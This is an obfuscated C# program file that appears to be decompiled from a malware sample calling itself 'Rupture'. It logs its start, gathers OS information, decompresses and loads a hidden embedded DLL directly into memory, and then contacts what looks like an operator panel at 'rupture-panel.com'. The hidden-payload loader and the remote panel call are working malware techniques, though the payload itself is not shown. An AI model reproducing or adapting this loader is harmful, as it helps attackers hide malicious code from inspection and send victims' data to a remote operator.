using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using Iycqbslx.Properties;
using SHNB83.Listeners;
using SHNB83.Specifications;

namespace Iycqbslx;

public static class Program
{
	private static Program DisableUtils;

	[STAThread]
	private static void InterruptExporter()
	{
		try
		{
			DatabaseAdapterSpec.QueryExporter();
		}
		catch
		{
		}
		AppDomain.CurrentDomain.AssemblyResolve += ConcatExporter;
		Tag.FlushExporter("Rupture Started");
		Tag.AssetExporter("Found OS information: {0}", DatabaseAdapterSpec.RateExporter());
		int num = 0;
		if (!InterruptUtils())
		{
			int num2 = default(int);
			num = num2;
		}
		switch (num)
		{
		}
		Exporter.SelectExporter("https://rupture-panel.com/");
	}

	private static Assembly ConcatExporter(object value, ResolveEventArgs reg)
	{
		using Stream stream = ViewUtils(Assembly.GetExecutingAssembly(), typeof(Program).Namespace + ".ClassLibrary1.dll");
		MemoryStream memoryStream = new MemoryStream();
		stream.CopyTo(memoryStream);
		byte[] rawAssembly;
		using (MemoryStream stream2 = new MemoryStream(memoryStream.ToArray()))
		{
			using MemoryStream memoryStream2 = new MemoryStream();
			using (BufferedStream bufferedStream = new BufferedStream(new GZipStream(stream2, CompressionMode.Decompress)))
			{
				bufferedStream.CopyTo(memoryStream2);
			}
			rawAssembly = memoryStream2.ToArray();
		}
		Assembly assembly = AppDomain.CurrentDomain.Load(rawAssembly);
		int num = 0;
		if (CallUtils() != null)
		{
			int num2 = default(int);
			num = num2;
		}
		return num switch
		{
			_ => assembly, 
		};
	}

	internal static bool InterruptUtils()
	{
		return DisableUtils == null;
	}

	internal static Program CallUtils()
	{
		return DisableUtils;
	}

	internal static object ViewUtils(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetManifestResourceStream((string)object_1);
	}
}
